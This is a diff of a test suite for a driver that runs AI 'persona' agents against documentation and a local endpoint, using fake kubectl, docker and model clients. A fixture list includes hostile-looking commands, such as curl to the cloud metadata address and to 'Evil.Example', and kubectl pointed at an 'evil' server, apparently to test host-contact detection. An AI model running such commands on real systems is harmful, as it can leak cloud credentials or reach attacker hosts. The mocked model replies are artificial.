-rm -rf "${work:?}/dsh/art"; mv "$work/dsh/art-keep" "$work/dsh/art"
-CASE="persona-uat-decrypt.sh is a plain bash script of the repository (executable), takes no key from the environment and writes no plaintext outside its mktemp directory (static)"
+mkdir -p "$work/dsh/run-noart/other-artifact"; cp "$work/dsh/run/other-artifact/"* "$work/dsh/run-noart/other-artifact/"
+FAKE_RUN="$work/dsh/run-noart" dsh_run 4242 "$work/test.key"
+CASE="persona-uat-decrypt.sh: a run without the persona artifact (only an unrelated one) fails (non-zero): it never decrypts a decoy it did not ask for"
+check test "$drc" -ne 0 -a -z "$(ls "$work"/dsh/tmp/* 2>/dev/null | head -1)"
+DSH_CWD="$work/dsh/nogit" dsh_run 4242 "$work/test.key"
+CASE="persona-uat-decrypt.sh run outside any clone (the real gh would find no repository unless -R is given): it either works with an explicit -R owner/repo or fails cleanly (non-zero) leaving no plaintext; it never succeeds on a wrong layout"
+check python3 - "$work" "$drc" <<'PY'
+import glob, sys
+w, rc = sys.argv[1], int(sys.argv[2])
+gh = open(w + "/dsh/gh.log").read()
+if rc == 0:
+    assert " -R " in " " + gh or "--repo" in gh, ("succeeded without a repository", gh)
+else:
+    assert not glob.glob(w + "/dsh/tmp/*")
+PY
+CASE="persona-uat-decrypt.sh is a plain bash script of the repository (executable), reads NO environment variable for the key (only HOME for the default path and TMPDIR for the directory), never echoes or cats the key, and writes no plaintext outside its mktemp directory (static)"
 check python3 - "$dsh" <<'PY'
 import os, re, sys
 t = open(sys.argv[1]).read()
 assert t.startswith("#!") and os.access(sys.argv[1], os.X_OK), "bin/persona-uat-decrypt.sh must be an executable script"
-assert "mktemp -d" in t and "chmod 700" in t or "umask 077" in t, "no private directory"
+assert "mktemp -d" in t and ("chmod 700" in t or "umask 077" in t), "no private directory"
 assert "gh run download" in t and "openssl cms -decrypt" in t, "the two commands the ruling names"
 assert not re.search(r"cat[^\n]*\$\{?key\b|echo[^\n]*\$\(\s*cat|<\s*\"?\$\{?key", t), "the key's CONTENT must never be echoed or catted"
+env_refs = {m for m in re.findall(r"\$\{?([A-Z][A-Z0-9_]*)", t) if re.search(r"KEY|SECRET|PASS|TOKEN|PERSONA|FOSTER", m)}
+assert not env_refs, ("the script reads an environment variable for the key (a key must come from an argument or the default file only)", sorted(env_refs))
+assert not re.search(r"\benv\b|\bprintenv\b|\bexport\b", "\n".join(t.splitlines()[1:])), "the script must not read or export the environment"
+assert re.search(r"(-n|--name)[ =]+[\"']?persona-uat-[a-z0-9-]+", t), "the script must select the persona artifact by its exact name (-n persona-uat-<name>)"
 PY
 
 # --- AC5: the agent reads only the public docs and the endpoint ------------------------------------------------
@@ -2000,7 +2158,7 @@ class Anthropic:
         if len(msgs) == 1:
             ctx = (kw.get("system", "") + " " + (msgs[0]["content"] if isinstance(msgs[0]["content"], str) else json.dumps(msgs[0]["content"]))).lower()
             role = next((n for n, ws in ROLE_WORDS if all(w in ctx for w in ws)), "none")      # which persona's instructions did THIS request carry
-            return _Msg(json.dumps({"action": "shell", "command": "cat README.md; echo $((6*7)); echo ROLE-" + role + "; python3 -c \"import urllib.request;print(urllib.request.urlopen('http://127.0.0.1:18080/').status)\""}))
+            return _Msg(json.dumps({"action": "shell", "command": "cat README.md; echo $((6*7)); echo ROLE-" + role + "; curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:18080/"}))
         last = msgs[-1]["content"] if isinstance(msgs[-1]["content"], str) else json.dumps(msgs[-1]["content"])
         if len(msgs) == 3:
             return _Msg(json.dumps({"action": "shell", "command": "cat docs/documented-step-that-does-not-exist.md"}))
@@ -2255,7 +2413,7 @@ for r in rows:
     assert r["links"] == []
 PY
 CASE="a persona that leaves a read-only directory behind (what a container of another uid does) does not defeat cleanup: the sandbox is gone after the run"
-run sbxleft '{"gradle-platform-engineer":{"readonly_dir":true},"maven-jenkins-ci":{"readonly_dir":true}}' rc
+run sbxleft '{"gradle-platform-engineer":{"readonly_dir":true,"foreign":true},"maven-jenkins-ci":{"readonly_dir":true,"foreign":true}}' rc
 trap_dirs=$(python3 - "$work/sbxleft/log" <<'PY'
 import json, sys
 print(" ".join(sorted({json.loads(l)["request"]["docs_dir"] for l in open(sys.argv[1])})))
@@ -2305,7 +2463,7 @@ print(json.dumps({
  "gradle-platform-engineer": {"commands": ["curl -s https://docs.example.org/guide/install -o /dev/null", "curl http://127.0.0.1:18080/healthz", "curl -s http://localhost:18080/x",
                                            "curl https://github.com/example/cache/releases/download/v1/x", "curl http://127.0.0.1:18081/login",
                                            "curl -o out.txt http://127.0.0.1:18080/a", "wget -O file.zip https://docs.example.org/a", "curl -s -o report.json https://docs.example.org/y",
-                                           "# https://commentonly.example/x\necho hi", "# see http://another-comment.example\n# and wget https://third-comment.example/z",
+                                           "# https://commentonly.example/x\necho hi", "# see http://another-comment.example\n# and wget https://third-comment.example/z", "curl -s http://127.0.0.1:18080/x # https://inline-only.example/y",
                                            "curl -s https://docs-only.example.net/guide", "curl -L https://github.com/example/cache/releases/latest"]},
  "maven-jenkins-ci": {"commands": ["curl -s https://repo.maven.apache.org/maven2/x.pom", "curl http://169.254.169.254/latest/meta-data", "curl -u a:b 'https://Evil.Example:8443/p?x=1'",
                                    "curl -s outside.example/path", "wget -q outside2.example:8080/f.tgz", "kubectl --server=k8s3.evil.example:6443 get pods",
@@ -2790,22 +2948,29 @@ check grep -qi 'did not run' "$(out leak)/maven-jenkins-ci.report.md"
 
 # --- ROUND 3 (review d6r3) ----------------------------------------------------------------------------------------------------------------------
 # the fake `create token` as the real kubectl and API server behave (flags, duration precision, audience, bound objects, usability of the issued token)
-CASE="fake kubectl create token (self-test): a whole-second Go duration of at most 24h is issued; 1h0.5s (sub-second precision), 100ms, 25h, abc, -1h and 0s are refused; --ttl and --bogus are unknown flags; a bound Secret that does not exist is an error; --audience, --duration and the bound-object flags are the ONLY token flags"
+CASE="fake kubectl create token (self-test; API behaviour, not the driver's 1h-24h POLICY): the API accepts a whole-second Go duration of 10 minutes or more, 0s and no flag (server default 1h), and 25h (accepted, SHORTENED to 24h); it refuses 1h0.5s (sub-second precision), 100ms, 5m (under 10 minutes), abc, -1h; --ttl and --bogus are unknown flags; a bound Secret that does not exist is an error"
 check python3 - "$fk" <<'PY'
-import subprocess, sys
+import base64, json, subprocess, sys
 d = sys.argv[1]
 k = d + "/hostbin/kubectl"
 def call(args):
     r = subprocess.run([k, "--kubeconfig", d + "/admin", "create", "token", "persona", "-n", "persona"] + args, capture_output=True, text=True)
     return r.returncode, r.stdout.strip()
-for ok in (["--duration", "1h"], ["--duration=90m"], ["--duration", "86400s"], ["--duration", "1.5h"], ["--duration", "1h0.0s"], []):
-    rc, out = call(ok)
-    assert rc == 0 and out.count(".") == 2, ("refused a valid request", ok)
-for bad in (["--duration", "1h0.5s"], ["--duration", "100ms"], ["--duration", "25h"], ["--duration", "abc"], ["--duration", "-1h"], ["--duration", "0s"], ["--ttl", "1h"], ["--bogus"],
+def life(tok):
+    pl = json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "=="))
+    return pl["exp"] - pl["iat"]
+want = {"1h": 3600, "90m": 5400, "86400s": 86400, "1.5h": 5400, "1h0.0s": 3600, "10m": 600, "0s": 3600, "25h": 86400}
+for dur, secs in want.items():
+    rc, out = call(["--duration", dur])
+    assert rc == 0 and out.count(".") == 2, ("the API refused a valid request", dur)
+    assert life(out) == secs, (dur, life(out))
+assert call([])[0] == 0
+for bad in (["--duration", "1h0.5s"], ["--duration", "100ms"], ["--duration", "5m"], ["--duration", "abc"], ["--duration", "-1h"], ["--ttl", "1h"], ["--bogus"],
             ["--bound-object-kind", "Secret", "--bound-object-name", "nope"], ["--bound-object-name", "nope"]):
     assert call(bad)[0] != 0, ("accepted", bad)
 PY
-CASE="fake kubectl persona credential (self-test): only a token this API server issued for the persona's ServiceAccount, unexpired, with the API audience, while the cluster exists, is answered; a token for another audience, a token never issued, an expired token and a deleted cluster are all refused"
+CASE="fake kubectl persona credential (self-test): only a token this API server issued for the persona's ServiceAccount, unexpired, with the API audience, while the cluster exists, is answered; a token for another audience, a token never issued, an expired token (a server that issues 1-second tokens whatever is asked) and a deleted cluster are all refused"
+fk3="$work/fk3"; mkdir -p "$fk3"; KIND_TOKEN_LIFETIME=1 mkhost "$fk3"; printf 'users:\n- user:\n    client-certificate-data: X\n' >"$fk3/admin"; : >"$fk3/alive"
 check python3 - "$fk" <<'PY'
 import json, os, subprocess, sys, time
 d = sys.argv[1]
@@ -2820,10 +2985,15 @@ good = issue(["--duration", "1h"])
 assert use(good) == 0, "a usable token was refused"
 assert use(issue(["--audience", "https://other.example", "--duration", "1h"])) != 0, "a token for another audience was accepted"
 assert use("aaa.bbb.ccc") != 0, "a token that was never issued was accepted"
-short = issue(["--duration", "1s"]); time.sleep(1.3)
-assert use(short) != 0, "an expired token was accepted"
 os.remove(d + "/alive")
 assert use(good) != 0, "a token was accepted although the cluster is gone"
+d3 = d.replace("/fk", "/fk3") if d.endswith("/fk") else d + "3"
+k3 = d3 + "/hostbin/kubectl"
+tok = subprocess.run([k3, "--kubeconfig", d3 + "/admin", "create", "token", "persona", "-n", "persona", "--duration", "1h"], capture_output=True, text=True).stdout.strip()
+open(d3 + "/persona-kc", "w").write(json.dumps({"users": [{"name": "p", "user": {"token": tok}}]}))
+assert subprocess.run([k3, "--kubeconfig", d3 + "/persona-kc", "get", "pods"], capture_output=True).returncode == 0, "a fresh 1-second token should work at once"
+time.sleep(1.4)
+assert subprocess.run([k3, "--kubeconfig", d3 + "/persona-kc", "get", "pods"], capture_output=True).returncode != 0, "an expired token was accepted"
 PY
 fk2="$work/fk2"; mkdir -p "$fk2"; mkhost "$fk2"; printf 'users:\n- user:\n    client-certificate-data: X\n' >"$fk2/admin"
 CASE="fake kubectl (self-test): a namespaced object applied BEFORE its Namespace exists is refused (NotFound), the same objects with the Namespace first (one call) are applied"
@@ -2866,18 +3036,31 @@ for r in rows:
     j = t.index(shl)
     opts, tail = t[2:j], t[j + 1:]
     assert opts == ["--network", "none", "--user", "0:0", "--label", lab, "-v", sb + ":/work", "-w", "/work"], opts
-    assert tail[:2] == ["rm", "-rf"] or (tail[:2] == ["sh", "-c"] and "rm -rf" in " ".join(tail[2:])), tail
-    assert "/work" in " ".join(tail), tail
     sweep = [k for k, x in enumerate(dl) if x[:1] == ["ps"] and "label=" + lab in x]
     assert sweep and sweep[0] < i, ("the cleanup must follow the label sweep", sweep, i)
+# the docker fake EXECUTED each cleanup with the shell's semantics against the sandbox mapping: nothing may be left, hidden or nested
+logs = [json.loads(l) for l in open(d + "/cleanup.log")]
+assert len(logs) == 5, logs
+for c in logs:
+    assert c["before"], ("the cleanup ran over an empty sandbox: nothing proves it deletes", c["sandbox"])
+    assert c["remaining"] == [], ("the cleanup command left entries behind (a no-op, a missing hidden-entry pattern or a wrong path)", c["tail"], c["remaining"])
+    assert c["tail"][:2] == ["rm", "-rf"] or c["tail"][:2] == ["sh", "-c"] or c["tail"][:3] == ["find", "/work", "-mindepth"], c["tail"]
 PY
-CASE="cross-tool sandbox (driver side): a persona that leaves a read-only directory is cleaned up with the cleanup container (the sandbox is gone), and the read-only tree is removed by the container's root run"
+CASE="cleanup across uids, driver side: sandboxes that hold entries a tool image created as another uid (a read-only dir, a hidden dir, a nested hidden dir, a dotfile, a '..weird' dir, a mode-000 file) are emptied BY THE ROOT CLEANUP COMMAND (the fake executed it: nothing remained at that moment, every foreign entry was there before), and the sandboxes are gone afterwards"
 check python3 - "$work/sbxleft" <<'PY'
 import json, os, sys
 d = sys.argv[1]
 dirs = {json.loads(l)["request"]["docs_dir"] for l in open(d + "/log")}
 assert dirs and not [x for x in dirs if os.path.exists(x)]
-assert [l for l in open(d + "/docker.log") if l.startswith("run --rm") and "--user 0:0" in l and "rm -rf" in l.replace("'", "")], "no cleanup container ran"
+logs = [json.loads(l) for l in open(d + "/cleanup.log")]
+assert len(logs) == 5, logs
+foreign = [c for c in logs if ".hidden-dir/deep/y" in c["before"]]
+assert len(foreign) == 2, ("two personas left foreign entries", [c["sandbox"] for c in foreign])
+for c in foreign:
+    for rel in ("created/x", ".hidden-dir/deep/y", "build/out/.cache/z", ".dotfile", "..weird/q", "locked/data"):
+        assert rel in c["before"], (rel, c["before"])
+for c in logs:
+    assert c["remaining"] == [], ("left behind", c["tail"], c["remaining"])
 PY
 # GitLab runner: faithful routes and a listener that may never come up
 CASE="runner readiness probes the runner's REAL endpoint: every request the started runner container received was GET /metrics (its mux registers only /metrics; / is a 404), and there was at least one"
@@ -2914,6 +3097,24 @@ for p, v in want.items():
     assert r.splitlines()[0] == "VERDICT: " + v, (p, r)
 PY
 check python3 "$work/windows.py" "$work/delayed" 5 settle
+# QUIESCENCE (stated bound): two equal readings do not prove the previous persona's work has drained. The driver's after-scrape therefore waits until the total has been
+# UNCHANGED across readings spanning at least 0.8 seconds, and gives up after 8 seconds; an increment landing later than that cannot be told from the next persona's own
+# traffic (documented limit, not tested). A delay of 0.6 s lands AFTER two quick equal readings but inside the quiet window.
+srvctl __reset
+srvctl __silent v 1
+srvctl __delay s 0.6
+run delayed2 '{"gradle-platform-engineer":{"requests":1},"maven-jenkins-ci":{"requests":0,"uncounted":["/healthz"]},"compliance-reviewer":{"requests":2},"readme-evaluator":{"requests":1},"on-call-engineer":{"requests":1}}' rc
+srvctl __delay s 0
+srvctl __silent v 0
+python3 -c "import time; time.sleep(1.5)"
+CASE="late completion after two equal readings (the server counts 0.6s AFTER the response; the driver waits for 0.8s of quiet, at most 8s): the persona's last request is still attributed to ITS window and the next persona (no counted request) is blocking, not credited"
+check python3 - "$(out delayed2)" <<'PY'
+import sys
+want = {"gradle-platform-engineer": "pass", "maven-jenkins-ci": "blocking", "compliance-reviewer": "pass", "readme-evaluator": "pass", "on-call-engineer": "pass"}
+for p, v in want.items():
+    assert open(sys.argv[1] + "/" + p + ".report.md").read().splitlines()[0] == "VERDICT: " + v, p
+PY
+check python3 "$work/windows.py" "$work/delayed2" 5 settle
 # the auth layer wraps the metrics middleware: a 401 is never counted
 run proofauth '{"readme-evaluator":{"requests":0,"unauth":3}}' rc
 CASE="a persona whose only traffic was answered 401 (withAuth wraps withMetrics, so it is never counted) made no counted request: blocking, the others pass"
@@ -2922,6 +3123,20 @@ check test "$(head -1 "$(out proofauth)/readme-evaluator.report.md")" = "VERDICT
 # --- PRIVACY, outcomes that exist only late in this file
 CASE="the public log is ONLY pass/fail lines in every outcome: clean, blocking, crash, a provider error carrying secrets, a dead image, missing docs: no finding, doc name, host, model name or transcript text, and the transcripts/reports exist only inside the encrypted artifacts"
 for c in clean blocking fc-crash hosts leak imgdead; do publiclog "$c" >/dev/null 2>&1 && ok "$CASE ($c)" || bad "$CASE ($c)"; done
+CASE="the driver runs with a PRIVATE TMPDIR and leaves no readable report or transcript anywhere in it (no plaintext copy outside --out: a temp file, a sandbox leftover, a staging file), in clean, blocking, crashed, leaking and encryption-failure runs; --out holds only the encrypted files"
+check python3 - "$work" <<'PY'
+import os, sys
+w = sys.argv[1]
+n = 0
+for case in ("clean", "blocking", "fc-crash", "leak", "hosts", "encfail-1"):
+    for r, _, fs in os.walk(w + "/" + case + "/tmp"):
+        for f in fs:
+            n += 1
+            c = open(os.path.join(r, f), "rb").read()
+            for marker in (b"VERDICT", b"TRANSCRIPT for", b"persona: ", b"tokens used", b"Hosts contacted", b"MODEL-DEFAULT-X", b"PARTIAL-TRANSCRIPT"):
+                assert marker not in c, (case, f, marker)
+assert os.path.isdir(w + "/clean/tmp"), "the run was not given a private TMPDIR"
+PY
 CASE="a hosts line, the repository-source flag and the findings are in NO public place: not in the log, not in an artifact file name (the hosts run)"
 check python3 - "$work/hosts" <<'PY'
 import os, sys
